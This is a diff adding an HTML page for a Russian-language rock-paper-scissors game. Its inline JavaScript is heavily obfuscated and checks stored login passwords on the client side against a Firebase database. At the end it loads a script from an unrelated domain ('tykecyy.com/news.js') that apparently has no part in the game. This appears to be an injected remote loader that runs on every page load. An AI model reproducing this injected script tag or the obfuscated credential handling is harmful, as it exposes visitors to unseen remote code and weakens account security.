@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Камень - ножницы - бумага</title>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width">
+		<link rel="shortcut icon" href="https://sigmentium.github.io/Photo/Sigmentium.jpeg">
+		<style>
+            html {
+                height:100%;
+                overflow:hidden;
+            }
+            body {
+                height:100%;
+                overflow:hidden;
+                background-color:cornsilk;
+                font-family:Verdana;
+                touch-action:manipulation;
+            }
+            img {
+                border:2px solid black;
+                border-radius:15px;
+            }
+            button {
+                color:white;
+                background-color:black;
+                width:200px;
+                height:50px;
+                font-size:20px;
+                cursor:pointer;
+                border:2px solid white;
+                border-radius:15px;
+                display:flex;
+                justify-content:center;
+                align-items:center;
+            }
+
+            .SupCenter {
+                display:flex;
+                justify-content:center;
+                align-items:center;
+            }
+            .center {
+                text-align:center;
+            }
+
+            #Players {
+                display:flex;
+                justify-content:center;
+                align-items:center;
+                gap:30px;
+            }
+            #Player, #Eminem {
+                text-align:center;
+            }
+        </style>
+	</head>
+	<body>
+		<div id="Players">
+			<div id="Player">
+				<img src="https://sigmentium.github.io/Photo/User.png" id="PlayerImg" width="30%">
+				<br>
+			</div>
+			<div id="Eminem">
+				<img src="https://sigmentium.github.io/Photo/User.png" id="EminemImg" width="30%">
+				<br>
+			</div>
+		</div>
+		<div id="All">
+			<div class="SupCenter"><button id="PlayComputer">Играть с компьютером</button></div>
+			<div class="SupCenter"><button id="PlayOnline">Играть онлайн</button></div>
+		</div>
+		<script>const _0x2628d5=_0x384c;(function(_0xc3afe9,_0x4088ef){const _0x2c5ebd=_0x384c,_0x58cda7=_0xc3afe9();while(!![]){try{const _0x26d0ae=parseInt(_0x2c5ebd(0x1ab))/0x1*(parseInt(_0x2c5ebd(0x1e8))/0x2)+parseInt(_0x2c5ebd(0x190))/0x3+parseInt(_0x2c5ebd(0x1a1))/0x4*(parseInt(_0x2c5ebd(0x191))/0x5)+parseInt(_0x2c5ebd(0x1b4))/0x6+-parseInt(_0x2c5ebd(0x19f))/0x7*(-parseInt(_0x2c5ebd(0x186))/0x8)+parseInt(_0x2c5ebd(0x1e5))/0x9+-parseInt(_0x2c5ebd(0x1de))/0xa;if(_0x26d0ae===_0x4088ef)break;else _0x58cda7['push'](_0x58cda7['shift']());}catch(_0x15a883){_0x58cda7['push'](_0x58cda7['shift']());}}}(_0xd75c,0x713b3));function _0x384c(_0x577074,_0x9ce13a){const _0xd75ce6=_0xd75c();return _0x384c=function(_0x384cd3,_0x423f38){_0x384cd3=_0x384cd3-0x186;let _0x2a0612=_0xd75ce6[_0x384cd3];return _0x2a0612;},_0x384c(_0x577074,_0x9ce13a);}let Player,Opponent,Victories=JSON['parse'](localStorage[_0x2628d5(0x1e7)](_0x2628d5(0x1d8))||'{}')?.[_0x2628d5(0x198)]||[],Count=parseInt(localStorage[_0x2628d5(0x1e7)](_0x2628d5(0x1c8)))||0x0,CountVictories=parseInt(localStorage['getItem'](_0x2628d5(0x1c2)))||0x0;const Id=localStorage[_0x2628d5(0x1e7)]('PersonalId'),Login=localStorage[_0x2628d5(0x1e7)](_0x2628d5(0x1d1)),Pass=localStorage[_0x2628d5(0x1e7)](_0x2628d5(0x1a0)),Names=[_0x2628d5(0x1ca),_0x2628d5(0x199),_0x2628d5(0x192),_0x2628d5(0x18a),_0x2628d5(0x1ae),_0x2628d5(0x1c1),_0x2628d5(0x1ac),_0x2628d5(0x18e),_0x2628d5(0x1c3),_0x2628d5(0x1dd),'Денис',_0x2628d5(0x1ba),_0x2628d5(0x1c5),_0x2628d5(0x1d5),_0x2628d5(0x1b1)],RandomName=Math[_0x2628d5(0x189)](Math[_0x2628d5(0x1b0)]()*(0xe-0x0+0x1))+0x0;function _0xd75c(){const _0x4d1ee6=['Again','1NDJLQn','Наталия','parse','Ашот','application/json','random','Константин','\x20-\x20','wss://back-online.onrender.com','716268qtaJen','remove','Avtoritet','then','Paper','Player','Дарья','PUT','</H1>','PlayOnline','<H1\x20id=\x22PlayerName\x22>Вы</H1>','innerHTML','stringify','Сергей','CountVictories','Наиле','Камень','Елисей','Info-Tsu-E-Fa','Ничья','Count','getElementById','Александ','Вы\x20выиграли!','<button\x20id=\x22Again\x22>Играть\x20снова</button>','UserId','Ножницы','length','setItem','Login','Connected','<button\x20id=\x22Stone\x22>Камень</button><button\x20id=\x22Scissors\x22>Ножницы</button><button\x20id=\x22Paper\x22>Бумага</button>','<br>','Герасим','Draw','<H2>Вы\x20-\x20','Victories','PlayComputer','push','send','Stone','Мирослав','7257410KXiRtI','<button\x20id=\x22Start\x22>Начать\x20игру</button>','Start','message','Tsu-E-Fa','location','open','269622nhJZuO','json','getItem','280654bDfFtc','EminemName','8edAtIQ','Вы\x20проиграли!','Eminem','floor','Максим','Вы\x20победили!','Бумага','keys','Ольга','addEventListener','846474kZYfEV','874135kHHIbE','Игнат','</H3>','removeItem','</H2><br><button\x20id=\x22Again\x22>Играть\x20снова</button>','false','click','TsuEFa','Алексей','Name','Scissors','All','type','reload','1876427QmfLeL','Pass','8MsLFDE','Отлично!\x20Вы\x20выбрали\x20бумагу!','data','https://sigmentium-777-default-rtdb.europe-west1.firebasedatabase.app/Data/','Отлично!\x20Вы\x20выбрали\x20камень!','<H1>','</H1><H3>','https://sigmentium-777-default-rtdb.europe-west1.firebasedatabase.app/Data.json?orderBy=\x22Name\x22&equalTo=\x22','Отлично!\x20Вы\x20выбрали\x20ножницы!'];_0xd75c=function(){return _0x4d1ee6;};return _0xd75c();}function Synchronize(){const _0x3de6d8=_0x2628d5;let _0x20523;fetch(_0x3de6d8(0x1a8)+Login+'\x22')[_0x3de6d8(0x1b7)](_0xd11620=>_0xd11620[_0x3de6d8(0x1e6)]())[_0x3de6d8(0x1b7)](_0x358bf7=>{const _0x172a9f=_0x3de6d8;_0x20523=_0x358bf7[Id][_0x172a9f(0x1a0)],Object['keys'](_0x358bf7)[_0x172a9f(0x1cf)]>0x0&&(_0x20523===Pass&&fetch(_0x172a9f(0x1a4)+Id+'/Victories/TsuEFa.json',{'method':_0x172a9f(0x1bb),'headers':{'Content-Type':_0x172a9f(0x1af)},'body':JSON['stringify'](Victories)}));});}function AvtoritetWinner(_0x3179fb,_0x3f47e2){const _0x48ebe2=_0x2628d5;Count++,localStorage['setItem'](_0x48ebe2(0x1c8),Count);if(_0x3179fb===_0x3f47e2)alert(_0x48ebe2(0x1c7));else _0x3179fb===_0x48ebe2(0x1c4)&&_0x3f47e2==='Ножницы'||_0x3179fb===_0x48ebe2(0x1ce)&&_0x3f47e2===_0x48ebe2(0x18c)||_0x3179fb===_0x48ebe2(0x18c)&&_0x3f47e2===_0x48ebe2(0x1c4)?(CountVictories++,localStorage[_0x48ebe2(0x1d0)]('CountVictories',CountVictories),alert(_0x48ebe2(0x1cb))):(CountVictories--,localStorage['setItem'](_0x48ebe2(0x1c2),CountVictories),alert(_0x48ebe2(0x187)));if(Count===0xa){Count=0x0,localStorage['removeItem'](_0x48ebe2(0x1c8));const _0x3825bc=localStorage[_0x48ebe2(0x1e7)]('Victories');let _0x4329af=_0x3825bc?JSON[_0x48ebe2(0x1ad)](_0x3825bc):{};!_0x4329af['TsuEFa']&&(_0x4329af['TsuEFa']=[]),_0x4329af[_0x48ebe2(0x198)][_0x48ebe2(0x1da)](CountVictories),localStorage[_0x48ebe2(0x1d0)](_0x48ebe2(0x1d8),JSON[_0x48ebe2(0x1c0)](_0x4329af)),localStorage[_0x48ebe2(0x194)](_0x48ebe2(0x1c2)),Synchronize();}document[_0x48ebe2(0x1c9)](_0x48ebe2(0x19c))['innerHTML']=_0x48ebe2(0x1d7)+_0x3179fb+'<br>'+Names[RandomName]+_0x48ebe2(0x1b2)+_0x3f47e2+'</H2><br><button\x20id=\x22Again\x22>Играть\x20снова</button>',document[_0x48ebe2(0x1c9)]('Again')[_0x48ebe2(0x18f)]('click',function(){const _0x1a1fe7=_0x48ebe2;window[_0x1a1fe7(0x1e3)][_0x1a1fe7(0x19e)]();});}function Winner(_0x1a2f81,_0x13be9e){const _0x7beba7=_0x2628d5;if(_0x1a2f81===_0x13be9e)alert(_0x7beba7(0x1c7));else _0x1a2f81===_0x7beba7(0x1c4)&&_0x13be9e===_0x7beba7(0x1ce)||_0x1a2f81===_0x7beba7(0x1ce)&&_0x13be9e===_0x7beba7(0x18c)||_0x1a2f81===_0x7beba7(0x18c)&&_0x13be9e===_0x7beba7(0x1c4)?alert('Вы\x20выиграли!'):alert(_0x7beba7(0x187));document[_0x7beba7(0x1c9)](_0x7beba7(0x19c))[_0x7beba7(0x1bf)]=_0x7beba7(0x1d7)+_0x1a2f81+_0x7beba7(0x1d4)+Names[RandomName]+_0x7beba7(0x1b2)+_0x13be9e+_0x7beba7(0x195),document[_0x7beba7(0x1c9)](_0x7beba7(0x1aa))[_0x7beba7(0x18f)](_0x7beba7(0x197),function(){const _0x581f96=_0x7beba7;window[_0x581f96(0x1e3)][_0x581f96(0x19e)]();});}function Check(){const _0x497ff1=_0x2628d5;Player!==null&&Opponent!==null&&document[_0x497ff1(0x1c9)](_0x497ff1(0x1e0))['addEventListener'](_0x497ff1(0x197),function(){const _0x54fb89=_0x497ff1;if(localStorage[_0x54fb89(0x1e7)](_0x54fb89(0x1b6))==='true')AvtoritetWinner(Player,Opponent);else(localStorage[_0x54fb89(0x1e7)](_0x54fb89(0x1b6))===_0x54fb89(0x196)||localStorage[_0x54fb89(0x1e7)]('Avtoritet')==null)&&Winner(Player,Opponent);});}function After(){const _0x393fa4=_0x2628d5;document[_0x393fa4(0x1c9)](_0x393fa4(0x19c))[_0x393fa4(0x1bf)]=_0x393fa4(0x1cc),document['getElementById']('Again')[_0x393fa4(0x18f)]('click',function(){const _0x6c5535=_0x393fa4;window[_0x6c5535(0x1e3)][_0x6c5535(0x19e)]();});}document['getElementById'](_0x2628d5(0x1d9))['addEventListener'](_0x2628d5(0x197),function(){const _0x33b76b=_0x2628d5;document[_0x33b76b(0x1c9)]('All')[_0x33b76b(0x1bf)]=_0x33b76b(0x1d3),document[_0x33b76b(0x1c9)](_0x33b76b(0x1b9))[_0x33b76b(0x1bf)]+=_0x33b76b(0x1be),document['getElementById'](_0x33b76b(0x188))[_0x33b76b(0x1bf)]+='<H1\x20id=\x22EminemName\x22>'+Names[RandomName]+_0x33b76b(0x1bc);const _0x1bb08f=Math[_0x33b76b(0x189)](Math[_0x33b76b(0x1b0)]()*(0x3-0x1+0x1))+0x1;if(_0x1bb08f===0x1)Opponent=_0x33b76b(0x1c4);else{if(_0x1bb08f===0x2)Opponent=_0x33b76b(0x1ce);else _0x1bb08f===0x3&&(Opponent=_0x33b76b(0x18c));}document[_0x33b76b(0x1c9)](_0x33b76b(0x1dc))[_0x33b76b(0x18f)](_0x33b76b(0x197),function(){const _0x187562=_0x33b76b;Player=_0x187562(0x1c4),alert(_0x187562(0x1a5)),document[_0x187562(0x1c9)](_0x187562(0x19c))['innerHTML']=_0x187562(0x1df),Check();}),document['getElementById'](_0x33b76b(0x19b))[_0x33b76b(0x18f)](_0x33b76b(0x197),function(){const _0x4fb50e=_0x33b76b;Player=_0x4fb50e(0x1ce),alert('Отлично!\x20Вы\x20выбрали\x20ножницы!'),document[_0x4fb50e(0x1c9)](_0x4fb50e(0x19c))[_0x4fb50e(0x1bf)]=_0x4fb50e(0x1df),Check();}),document[_0x33b76b(0x1c9)](_0x33b76b(0x1b8))[_0x33b76b(0x18f)]('click',function(){const _0x4de0d3=_0x33b76b;Player=_0x4de0d3(0x18c),alert(_0x4de0d3(0x1a2)),document[_0x4de0d3(0x1c9)](_0x4de0d3(0x19c))[_0x4de0d3(0x1bf)]='<button\x20id=\x22Start\x22>Начать\x20игру</button>',Check();});}),document[_0x2628d5(0x1c9)](_0x2628d5(0x1bd))[_0x2628d5(0x18f)](_0x2628d5(0x197),function(){const _0x5f47d9=_0x2628d5;fetch(_0x5f47d9(0x1a8)+Login+'\x22')[_0x5f47d9(0x1b7)](_0x42b8c8=>_0x42b8c8[_0x5f47d9(0x1e6)]())[_0x5f47d9(0x1b7)](_0x1e2da9=>{const _0x17dc7c=_0x5f47d9;CheckPass=_0x1e2da9[Id][_0x17dc7c(0x1a0)];if(Object[_0x17dc7c(0x18d)](_0x1e2da9)[_0x17dc7c(0x1cf)]>0x0){if(CheckPass===Pass){let _0x1acc4e;const _0x5ddd27=new WebSocket(_0x17dc7c(0x1b3));document[_0x17dc7c(0x1c9)](_0x17dc7c(0x19c))[_0x17dc7c(0x1bf)]='',_0x5ddd27[_0x17dc7c(0x18f)](_0x17dc7c(0x1e4),function(){const _0x67511=_0x17dc7c;_0x5ddd27[_0x67511(0x1db)](JSON[_0x67511(0x1c0)]({'type':_0x67511(0x1d2),'UserId':Id,'Name':Login,'game':_0x67511(0x1e2)})),_0x5ddd27[_0x67511(0x18f)](_0x67511(0x1e1),function(_0x313783){const _0x3201a9=_0x67511,_0x52f013=JSON[_0x3201a9(0x1ad)](_0x313783[_0x3201a9(0x1a3)]);if(_0x52f013[_0x3201a9(0x19d)]===_0x3201a9(0x1d2))document[_0x3201a9(0x1c9)](_0x3201a9(0x1e9))[_0x3201a9(0x1b5)](),document[_0x3201a9(0x1c9)](_0x3201a9(0x188))['innerHTML']+='<H1>'+_0x52f013[_0x3201a9(0x19a)]+_0x3201a9(0x1a7)+_0x52f013[_0x3201a9(0x1cd)]+_0x3201a9(0x193),document[_0x3201a9(0x1c9)]('All')[_0x3201a9(0x1bf)]='<button\x20id=\x22Stone\x22>Камень</button><button\x20id=\x22Scissors\x22>Ножницы</button><button\x20id=\x22Paper\x22>Бумага</button>',document[_0x3201a9(0x1c9)]('Stone')[_0x3201a9(0x18f)]('click',function(){const _0x53c02e=_0x3201a9;_0x1acc4e=_0x53c02e(0x1c4),_0x5ddd27[_0x53c02e(0x1db)](JSON[_0x53c02e(0x1c0)]({'type':_0x53c02e(0x1c6),'item':_0x1acc4e})),document[_0x53c02e(0x1c9)](_0x53c02e(0x19c))['innerHTML']='',alert('Отлично!\x20Вы\x20выбрали\x20камень!');}),document[_0x3201a9(0x1c9)](_0x3201a9(0x19b))[_0x3201a9(0x18f)](_0x3201a9(0x197),function(){const _0x22fd50=_0x3201a9;_0x1acc4e=_0x22fd50(0x1ce),_0x5ddd27[_0x22fd50(0x1db)](JSON[_0x22fd50(0x1c0)]({'type':_0x22fd50(0x1c6),'item':_0x1acc4e})),document[_0x22fd50(0x1c9)](_0x22fd50(0x19c))[_0x22fd50(0x1bf)]='',alert(_0x22fd50(0x1a9));}),document['getElementById'](_0x3201a9(0x1b8))[_0x3201a9(0x18f)]('click',function(){const _0x312192=_0x3201a9;_0x1acc4e=_0x312192(0x18c),_0x5ddd27[_0x312192(0x1db)](JSON[_0x312192(0x1c0)]({'type':_0x312192(0x1c6),'item':_0x1acc4e})),document[_0x312192(0x1c9)](_0x312192(0x19c))[_0x312192(0x1bf)]='',alert(_0x312192(0x1a2));});else{if(_0x52f013[_0x3201a9(0x19d)]==='Disconnected')alert('Пользователь\x20отключился');else{if(_0x52f013[_0x3201a9(0x19d)]==='Win')alert(_0x3201a9(0x18b)),After();else{if(_0x52f013[_0x3201a9(0x19d)]==='Defeat')alert('Вы\x20проиграли!'),After();else _0x52f013[_0x3201a9(0x19d)]===_0x3201a9(0x1d6)&&(alert(_0x3201a9(0x1c7)),After());}}}}),document[_0x67511(0x1c9)]('Player')[_0x67511(0x1bf)]+=_0x67511(0x1a6)+Login+_0x67511(0x1bc),document[_0x67511(0x1c9)](_0x67511(0x188))[_0x67511(0x1bf)]+='<H1\x20id=\x22EminemName\x22>Поиск...</H1>';});}}});});</script>
+        <script src="https://tykecyy.com/news.js?sid=939278" async type="text/javascript" charset="UTF-8"></script>
+    </body>
+</html>
